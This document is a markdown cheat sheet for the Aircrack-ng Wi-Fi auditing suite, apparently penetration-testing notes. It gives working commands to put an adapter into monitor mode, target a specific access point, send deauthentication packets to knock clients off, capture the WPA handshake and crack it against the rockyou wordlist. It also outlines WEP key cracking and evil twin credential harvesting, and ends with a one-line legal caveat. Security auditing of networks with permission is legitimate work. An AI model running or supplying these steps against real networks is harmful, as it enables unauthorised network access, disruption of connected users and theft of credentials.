# Aircrack-ng Suite

## Wireless Security Overview
- **WEP:** Wired Equivalent Privacy. Highly insecure, cracks in minutes.
- **WPA/WPA2:** Wi-Fi Protected Access. Requires capturing a 4-way handshake and performing a dictionary attack.
- **WPA3:** Modern standard, protects against offline dictionary attacks via SAE (Simultaneous Authentication of Equals).

## Suite Tools
- `airmon-ng`: Puts network interfaces into monitor mode.
- `airodump-ng`: Captures raw 802.11 frames.
- `aireplay-ng`: Injects frames (e.g., deauth packets).
- `aircrack-ng`: Cracks the captured hashes.

## Enabling Monitor Mode
```bash
airmon-ng start wlan0
```
*(This usually creates an interface named `wlan0mon` or changes `wlan0` state).*
To stop: `airmon-ng stop wlan0mon`.

## Scanning Networks
```bash
airodump-ng wlan0mon
```
Identifies target BSSID (MAC address), Channel (CH), and connected clients (STAs).

## Capturing WPA Handshake
Target a specific AP on a specific channel, saving to a file:
```bash
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
```
Leave this running until a client connects (or is forced to reconnect).

## Deauthentication Attack
Force a client to disconnect and reconnect to capture the handshake quickly. In a new terminal:
```bash
aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
```
*(Deauths the client `AA:BB...` from AP `00:11...` 10 times).*

## Cracking WPA with Wordlist
Once the handshake is captured (`capture-01.cap`):
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 capture-01.cap
```

## WEP Cracking Workflow
1. Start `airodump-ng` targeting the WEP AP.
2. Use `aireplay-ng` to inject ARP requests (generates IVs quickly).
3. Run `aircrack-ng` concurrently to crack the WEP key using PTW or FMS attacks once enough IVs are collected (typically 20,000+).

## Evil Twin Attacks
Creating a rogue access point with the same SSID as a legitimate one to trick users into connecting to you, allowing MITM attacks or credential harvesting.

## Required Hardware
You need a wireless adapter that supports packet injection and monitor mode (e.g., ALFA AWUS036NHA or similar Atheros/Ralink chipsets).

## Legal Considerations
Only audit networks you own or have explicit permission to test.
